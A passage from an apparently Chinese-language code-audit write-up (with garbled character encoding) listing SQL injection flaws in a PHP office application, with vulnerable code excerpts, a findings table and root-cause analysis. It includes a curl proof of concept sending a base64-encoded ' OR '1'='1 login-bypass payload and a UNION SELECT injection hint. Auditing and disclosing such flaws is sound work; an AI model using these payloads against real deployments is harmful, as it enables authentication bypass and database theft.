class="string">&quot;`mobile`=&#x27;<span class="subst">$shouji</span>&#x27; AND `status`=1&quot;</span>);  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>:</p><ul><li><code>$shouji</code> å¯æ³¨å…¥SQL</li><li>å¯ä»¥ç»•è¿‡èº«ä»½è®¤è¯</li></ul><p><strong>POC</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shouji=$(<span class="built_in">echo</span> -n <span class="string">&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span> | <span class="built_in">base64</span>)</span><br><span class="line">curl <span class="string">&quot;http://target/index.php?a=jinxwqqtb&amp;m=login&amp;d=api&amp;ajaxbool=true&amp;shouji=<span class="variable">$&#123;shouji&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€4ã€‘loginAction-php-yzmAction-Mobile-SQLæ³¨å…¥2-â­â­â­â­â­"><a href="#ã€4ã€‘loginAction-php-yzmAction-Mobile-SQLæ³¨å…¥2-â­â­â­â­â­" class="headerlink" title="ã€4ã€‘loginAction.php - yzmAction() - Mobile SQLæ³¨å…¥2 â­â­â­â­â­"></a>ã€4ã€‘loginAction.php - yzmAction() - Mobile SQLæ³¨å…¥2 â­â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/task/api/loginAction.php:263</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yzmAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mobile&#x27;</span>);</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$mobile</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">c</span>(<span class="string">&#x27;check&#x27;</span>)-&gt;<span class="title function_ invoke__">iscnmobile</span>(<span class="variable">$mobile</span>))<span class="keyword">return</span> <span class="title function_ invoke__">returnerror</span>(<span class="string">&#x27;err2&#x27;</span>);</span><br><span class="line">    <span class="variable">$where</span>  = <span class="string">&quot;`mobile`=&#x27;<span class="subst">$mobile</span>&#x27;&quot;</span>;  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    <span class="comment">// ... m(&#x27;admin&#x27;)-&gt;getone($where)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="ã€5ã€‘goodsModel-php-getpage-Keyword-LIKEæ³¨å…¥-â­â­â­â­"><a href="#ã€5ã€‘goodsModel-php-getpage-Keyword-LIKEæ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€5ã€‘goodsModel.php - getpage() - Keyword LIKEæ³¨å…¥ â­â­â­â­"></a>ã€5ã€‘goodsModel.php - getpage() - Keyword LIKEæ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/model/goodsModel.php:123</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getpage</span>(<span class="params"><span class="variable">$where</span>=<span class="string">&#x27;1=1&#x27;</span>,<span class="variable">$fields</span>=<span class="string">&#x27;*&#x27;</span>,<span class="variable">$order</span>=<span class="string">&#x27;sort&#x27;</span>,<span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>  = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$key</span>))&#123;</span><br><span class="line">        <span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">        <span class="variable">$where</span>.= <span class="string">&quot; and (a.`name` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`num` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`xinghao` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`guige` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>: å¯ä»¥åœ¨LIKEä¸­æ³¨å…¥ï¼š<code>%&#39; UNION SELECT ...--</code></p><hr><h3 id="ã€6-7ã€‘crmModel-php-getclientselect-getclientpage-LIKEæ³¨å…¥-â­â­â­â­"><a href="#ã€6-7ã€‘crmModel-php-getclientselect-getclientpage-LIKEæ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€6-7ã€‘crmModel.php - getclientselect() &#x2F; getclientpage() - LIKEæ³¨å…¥ â­â­â­â­"></a>ã€6-7ã€‘crmModel.php - getclientselect() &#x2F; getclientpage() - LIKEæ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/model/crmModel.php:17,41</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¬¬17è¡Œ</span></span><br><span class="line"><span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="variable">$where</span>.= <span class="string">&quot; and (`name` like &#x27;%<span class="subst">$key</span>%&#x27; or `unitname` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// âš ï¸ æ‹¼æ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬41è¡Œ</span></span><br><span class="line"><span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="variable">$where</span>.= <span class="string">&quot; and (`name` like &#x27;%<span class="subst">$key</span>%&#x27; or `unitname` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// âš ï¸ æ‹¼æ¥</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€8ã€‘loginModel-php-cookieç™»å½•-Token-SQLæ³¨å…¥-â­â­â­â­"><a href="#ã€8ã€‘loginModel-php-cookieç™»å½•-Token-SQLæ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€8ã€‘loginModel.php - cookieç™»å½• - Token SQLæ³¨å…¥ â­â­â­â­"></a>ã€8ã€‘loginModel.php - cookieç™»å½• - Token SQLæ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/model/loginModel.php:361</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tokans</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;mo_adminid&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†cookie</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$tokans</span>))&#123;</span><br><span class="line">    <span class="variable">$onrs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;`token`=&#x27;<span class="subst">$tokans</span>&#x27;&quot;</span>,<span class="string">&#x27;`name`,`token`,`id`,`uid`&#x27;</span>);  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å±å®³</strong>:</p><ul><li>é€šè¿‡cookieæ³¨å…¥</li><li>å¯èƒ½ç»•è¿‡ç™»å½•éªŒè¯</li></ul><hr><h3 id="ã€9ã€‘uploadAction-php-getwobaAction-åˆ†ç±»è¿‡æ»¤æ³¨å…¥-â­â­â­â­"><a href="#ã€9ã€‘uploadAction-php-getwobaAction-åˆ†ç±»è¿‡æ»¤æ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€9ã€‘uploadAction.php - getwobaAction() - åˆ†ç±»è¿‡æ»¤æ³¨å…¥ â­â­â­â­"></a>ã€9ã€‘uploadAction.php - getwobaAction() - åˆ†ç±»è¿‡æ»¤æ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/task/api/uploadAction.php:555</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getwobaAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$fenlei</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;fenlei&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="variable">$where</span>  = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">getjoinstr</span>(<span class="string">&#x27;a.`receid`&#x27;</span>, <span class="variable">$this</span>-&gt;adminid, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// ... ç„¶åæ‹¼æ¥åˆ°SQL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="ã€10ã€‘uploadAction-php-getfileAction-Keywordè¿‡æ»¤æ³¨å…¥-â­â­â­â­"><a href="#ã€10ã€‘uploadAction-php-getfileAction-Keywordè¿‡æ»¤æ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€10ã€‘uploadAction.php - getfileAction() - Keywordè¿‡æ»¤æ³¨å…¥ â­â­â­â­"></a>ã€10ã€‘uploadAction.php - getfileAction() - Keywordè¿‡æ»¤æ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/task/api/uploadAction.php:621</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">xssrepstr</span>(<span class="variable">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>));  <span class="comment">// âš ï¸ åªæœ‰xssrepstrï¼Œæ²¡æœ‰SQLè¿‡æ»¤</span></span><br><span class="line"><span class="variable">$where</span>.=<span class="string">&quot; and `filename` like &#x27;%&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;%&#x27;&quot;</span>;  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€11-13ã€‘upgradeAction-php-ä¸‰ä¸ªæå±SQLç›´æ¥æ‰§è¡Œæ¼æ´-â­â­â­â­â­"><a href="#ã€11-13ã€‘upgradeAction-php-ä¸‰ä¸ªæå±SQLç›´æ¥æ‰§è¡Œæ¼æ´-â­â­â­â­â­" class="headerlink" title="ã€11-13ã€‘upgradeAction.php - ä¸‰ä¸ªæå±SQLç›´æ¥æ‰§è¡Œæ¼æ´ â­â­â­â­â­"></a>ã€11-13ã€‘upgradeAction.php - ä¸‰ä¸ªæå±SQLç›´æ¥æ‰§è¡Œæ¼æ´ â­â­â­â­â­</h3><h4 id="11-shengjianssAjax-SQLè¯­å¥ç›´æ¥æ‰§è¡Œ"><a href="#11-shengjianssAjax-SQLè¯­å¥ç›´æ¥æ‰§è¡Œ" class="headerlink" title="11. shengjianssAjax() - SQLè¯­å¥ç›´æ¥æ‰§è¡Œ"></a>11. shengjianssAjax() - SQLè¯­å¥ç›´æ¥æ‰§è¡Œ</h4><p><strong>æ–‡ä»¶</strong>: <code>/webmain/system/upgrade/upgradeAction.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fcont</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>]);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$type</span>==<span class="number">10</span>)&#123;</span><br><span class="line">    <span class="variable">$sqarr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;ROCKSPLIT&#x27;</span>, <span class="variable">$fcont</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$sqarr</span> <span class="keyword">as</span> <span class="variable">$_sql1</span>)<span class="keyword">if</span>(<span class="variable">$_sql1</span>)&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$_sql1</span>,<span class="literal">false</span>);  <span class="comment">// âš ï¸ ç›´æ¥æ‰§è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="12-shengjifile"><a href="#12-shengjifile" class="headerlink" title="12. shengjifile()"></a>12. shengjifile()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fcont</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$barr</span>[<span class="string">&#x27;data&#x27;</span>]);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="variable">$bmsg</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;beifen&#x27;</span>)-&gt;<span class="title function_ invoke__">updatefabric</span>(<span class="variable">$fcont</span>);  <span class="comment">// âš ï¸ ç›´æ¥ä¼ å…¥</span></span><br></pre></td></tr></table></figure><h4 id="13-newinstallinfoAjax"><a href="#13-newinstallinfoAjax" class="headerlink" title="13. newinstallinfoAjax()"></a>13. newinstallinfoAjax()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nwsp</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;path&#x27;</span>));  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line"><span class="comment">// ... è¯»å–æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$bmsg</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;beifen&#x27;</span>)-&gt;<span class="title function_ invoke__">updatefabric</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$mysqlpath</span>), <span class="number">1</span>);  <span class="comment">// âš ï¸ æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€14ã€‘whereModel-php-getstrwhere-WHEREå­å¥æ³¨å…¥-â­â­â­â­"><a href="#ã€14ã€‘whereModel-php-getstrwhere-WHEREå­å¥æ³¨å…¥-â­â­â­â­" class="headerlink" title="ã€14ã€‘whereModel.php - getstrwhere() - WHEREå­å¥æ³¨å…¥ â­â­â­â­"></a>ã€14ã€‘whereModel.php - getstrwhere() - WHEREå­å¥æ³¨å…¥ â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/model/whereModel.php:231</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getstrwhere</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$uid</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$fid</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$where</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$str</span>);  <span class="comment">// âš ï¸ è§£å¯†</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$where</span>==<span class="string">&#x27;all&#x27;</span> || <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;super&#125;&#x27;</span>) || </span><br><span class="line">        <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;allsuper&#125;&#x27;</span>) || </span><br><span class="line">        <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;company&#125;&#x27;</span>))<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// ... ç„¶åç›´æ¥ç”¨äºSQL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é…åˆä½¿ç”¨çš„åœ°æ–¹</strong>ï¼ˆflowModel.php:152ï¼‰:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wheresstr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getstrwhere</span>(<span class="variable">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$rs</span>[<span class="string">&#x27;wheresstr&#x27;</span>]), <span class="variable">$uid</span>, <span class="variable">$fid</span>);</span><br><span class="line"><span class="comment">// ... ç›´æ¥æ‹¼æ¥åˆ°SQL</span></span><br></pre></td></tr></table></figure><hr><h3 id="ã€15ã€‘webmainAction-php-limitRows-WHERE-KEYWHEREæ³¨å…¥-â­â­â­â­â­"><a href="#ã€15ã€‘webmainAction-php-limitRows-WHERE-KEYWHEREæ³¨å…¥-â­â­â­â­â­" class="headerlink" title="ã€15ã€‘webmainAction.php - limitRows() - WHERE&#x2F;KEYWHEREæ³¨å…¥ â­â­â­â­â­"></a>ã€15ã€‘webmainAction.php - limitRows() - WHERE&#x2F;KEYWHEREæ³¨å…¥ â­â­â­â­â­</h3><p><strong>æ–‡ä»¶</strong>: <code>/webmain/webmainAction.php:120</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">limitRows</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$fields</span>=<span class="string">&#x27;*&#x27;</span>,<span class="variable">$wherea</span>=<span class="string">&#x27;1=1&#x27;</span>,<span class="variable">$order</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;keywhere&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$where</span>))&#123;</span><br><span class="line">        <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$where</span>));  <span class="comment">// âš ï¸ å…ˆè¿‡æ»¤åŠ å¯†ä¸²ï¼Œå†è§£å¯†</span></span><br><span class="line">        <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">covexec</span>(<span class="variable">$where</span>));  <span class="comment">// âš ï¸ filterstrå·²å¼ƒç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$keywhere</span>))&#123;</span><br><span class="line">        <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$keywhere</span>));  <span class="comment">// âš ï¸ è¿‡æ»¤é€»è¾‘é”™è¯¯</span></span><br><span class="line">        <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">covexec</span>(<span class="variable">$keywhere</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$wherea</span> .= <span class="string">&quot; <span class="subst">$where</span> <span class="subst">$keywhere</span>&quot;</span>;  <span class="comment">// âš ï¸ ç›´æ¥æ‹¼æ¥</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é—®é¢˜</strong>:</p><ul><li><strong>å…ˆå¯¹åŠ å¯†ä¸²è¿‡æ»¤ï¼ˆæ— æ•ˆï¼‰</strong></li><li><strong>å†è§£å¯†ï¼ˆæ¢å¤SQLå…³é”®å­—ï¼‰</strong></li><li><strong>ç„¶åç”¨å·²å¼ƒç”¨çš„filterstrï¼ˆä¸èµ·ä½œç”¨ï¼‰</strong></li></ul><hr><h2 id="ğŸ“Š-æ¼æ´ç»Ÿè®¡"><a href="#ğŸ“Š-æ¼æ´ç»Ÿè®¡" class="headerlink" title="ğŸ“Š æ¼æ´ç»Ÿè®¡"></a>ğŸ“Š æ¼æ´ç»Ÿè®¡</h2><table><thead><tr><th align="left">åºå·</th><th align="left">æ–‡ä»¶</th><th align="left">æ–¹æ³•</th><th align="left">è§£å¯†æ–¹å¼</th><th align="left">å±å®³ç­‰çº§</th><th align="left">æ˜¯å¦æœ‰è¿‡æ»¤</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">inputAction.php</td><td align="left">getselectdataAjax</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">2</td><td align="left">tableAction.php</td><td align="left">savedbupurlAjax</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">3</td><td align="left">loginAction.php</td><td align="left">jinxwqqtbAction</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">4</td><td align="left">loginAction.php</td><td align="left">yzmAction</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">5</td><td align="left">goodsModel.php</td><td align="left">getpage</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">6</td><td align="left">crmModel.php</td><td align="left">getclientselect</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">7</td><td align="left">crmModel.php</td><td align="left">getclientpage</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">8</td><td align="left">loginModel.php</td><td align="left">cookieç™»å½•</td><td align="left">uncrypt</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">9</td><td align="left">uploadAction.php</td><td align="left">getwobaAction</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">10</td><td align="left">uploadAction.php</td><td align="left">getfileAction</td><td align="left">base64decode</td><td align="left">ä»…xssrepstr</td><td align="left">æ— SQLè¿‡æ»¤</td></tr><tr><td align="left">11</td><td align="left">upgradeAction.php</td><td align="left">shengjianssAjax</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">12</td><td align="left">upgradeAction.php</td><td align="left">shengjifile</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">13</td><td align="left">upgradeAction.php</td><td align="left">newinstallinfoAjax</td><td align="left">base64decode</td><td align="left">â­â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">14</td><td align="left">whereModel.php</td><td align="left">getstrwhere</td><td align="left">base64decode</td><td align="left">â­â­â­â­</td><td align="left"><strong>æ— </strong></td></tr><tr><td align="left">15</td><td align="left">webmainAction.php</td><td align="left">limitRows</td><td align="left">uncrypt</td><td align="left">â­â­â­â­â­</td><td align="left">è¿‡æ»¤é€»è¾‘é”™è¯¯</td></tr></tbody></table><hr><h2 id="ğŸ¯-æ ¹æœ¬åŸå› åˆ†æ"><a href="#ğŸ¯-æ ¹æœ¬åŸå› åˆ†æ" class="headerlink" title="ğŸ¯ æ ¹æœ¬åŸå› åˆ†æ"></a>ğŸ¯ æ ¹æœ¬åŸå› åˆ†æ</h2><h3 id="1-é”™è¯¯çš„åŠ å¯†-å®‰å…¨çš„æ€ç»´"><a href="#1-é”™è¯¯çš„åŠ å¯†-å®‰å…¨çš„æ€ç»´" class="headerlink" title="1. é”™è¯¯çš„åŠ å¯†&#x3D;å®‰å…¨çš„æ€ç»´"></a>1. é”™è¯¯çš„åŠ å¯†&#x3D;å®‰å…¨çš„æ€ç»´</h3><p>å¼€å‘è€…è®¤ä¸ºåªè¦å‚æ•°åŠ å¯†äº†å°±å®‰å…¨ï¼Œ<strong>å¿˜è®°äº†è§£å¯†åè¿˜éœ€è¦è¿‡æ»¤</strong></p><h3 id="2-è¿‡æ»¤æ—¶æœºé”™è¯¯"><a href="#2-è¿‡æ»¤æ—¶æœºé”™è¯¯" class="headerlink" title="2. è¿‡æ»¤æ—¶æœºé”™è¯¯"></a>2. è¿‡æ»¤æ—¶æœºé”™è¯¯</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é”™è¯¯ç¤ºä¾‹ï¼š</span></span><br><span class="line"><span class="title function_ invoke__">iconvsql</span>(<span class="variable">$encrypted_string</span>)  <span class="comment">// è¿‡æ»¤åŠ å¯†ä¸² â† æ— æ„ä¹‰</span></span><br><span class="line">jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$filtered</span>)       <span class="comment">// è§£å¯†åæ¢å¤SQLå…³é”®å­—</span></span><br></pre></td></tr></table></figure><p><strong>æ­£ç¡®åº”è¯¥æ˜¯</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$plain</span> = jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$encrypted</span>)  <span class="comment">// å…ˆè§£å¯†</span></span><br><span class="line"><span class="variable">$safe</span>  = <span class="title function_ invoke__">iconvsql</span>(<span class="variable">$plain</span>)         <span class="comment">// å†è¿‡æ»¤æ˜æ–‡</span></span><br></pre></td></tr></table></figure><h3 